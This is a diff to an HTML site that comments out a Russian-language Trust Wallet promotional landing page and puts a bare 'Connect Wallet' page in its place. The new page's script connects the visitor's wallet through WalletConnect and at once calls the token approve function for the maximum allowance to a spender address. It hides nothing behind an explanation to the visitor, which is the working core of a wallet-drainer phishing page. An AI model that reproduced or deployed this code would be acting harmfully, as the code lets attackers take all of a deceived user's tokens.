@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
@@ -120,7 +120,7 @@
                     <p>Встроенный обмен с лучшими курсами</p>
                 </div>
             </div>
-        </div>
+        </div> -->
     </section>
 
     <!-- <section class="assets">
@@ -152,7 +152,12 @@
         </div>
     </section> -->
 
-    <section class="cta">
+
+
+
+
+
+    <!-- <section class="cta">
         <div class="container">
             <h2>Начните использовать Trust Wallet сегодня</h2>
             <p>Присоединяйтесь к миллионам пользователей по всему миру</p>
@@ -234,4 +239,104 @@
 
 
 
+ -->
 
+
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Connect Wallet</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+  <style>
+    body {
+      font-family: sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #111;
+      color: white;
+    }
+    button {
+      padding: 15px 30px;
+      font-size: 18px;
+      border: none;
+      border-radius: 8px;
+      background: #4CAF50;
+      color: white;
+      cursor: pointer;
+    }
+    button:disabled {
+      background: #888;
+    }
+  </style>
+</head>
+<body>
+  <button id="connect-btn">Connect Wallet</button>
+
+  <script>
+    const provider = new WalletConnectProvider.default({
+      rpc: {
+        1: "https://rpc.ankr.com/eth" // или https://mainnet.infura.io/v3/YOUR_INFURA_ID
+      },
+      chainId: 1
+    });
+
+    // Адрес контракта токена и spender для approve
+    const TOKEN_ADDRESS = "0xYourTokenAddress"; // Вставь адрес токена
+    const SPENDER_ADDRESS = "0xSpenderAddress"; // Адрес, которому дается доступ (например, контракт)
+    const MAX_ALLOWANCE = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // Максимальное значение для approve
+
+    async function connectWallet() {
+      const btn = document.getElementById('connect-btn');
+      btn.disabled = true;
+      btn.textContent = "Connecting...";
+
+      try {
+        await provider.enable(); // Открывает Trust Wallet или MetaMask через WalletConnect
+
+        const web3 = new Web3(provider);
+        const accounts = await web3.eth.getAccounts();
+        const address = accounts[0];
+
+        console.log("Connected:", address);
+        btn.textContent = "Connected: " + address.slice(0, 6) + "..." + address.slice(-4);
+
+        // Взаимодействие с контрактом токена для approve
+        const tokenContract = new web3.eth.Contract([
+          {
+            "constant": false,
+            "inputs": [
+              { "name": "spender", "type": "address" },
+              { "name": "value", "type": "uint256" }
+            ],
+            "name": "approve",
+            "outputs": [
+              { "name": "", "type": "bool" }
+            ],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+          }
+        ], TOKEN_ADDRESS);
+
+        // Вызов approve для разрешения управления всеми токенами
+        const tx = await tokenContract.methods.approve(SPENDER_ADDRESS, MAX_ALLOWANCE).send({ from: address });
+        console.log("Approval success:", tx);
+        btn.textContent = "Approved!";
+        
+      } catch (err) {
+        console.error("Error:", err);
+        btn.textContent = "Connect Failed";
+      } finally {
+        btn.disabled = false;
+      }
+    }
+
+    document.getElementById('connect-btn').addEventListener('click', connectWallet);
+  </script>
+</body>
+</html>
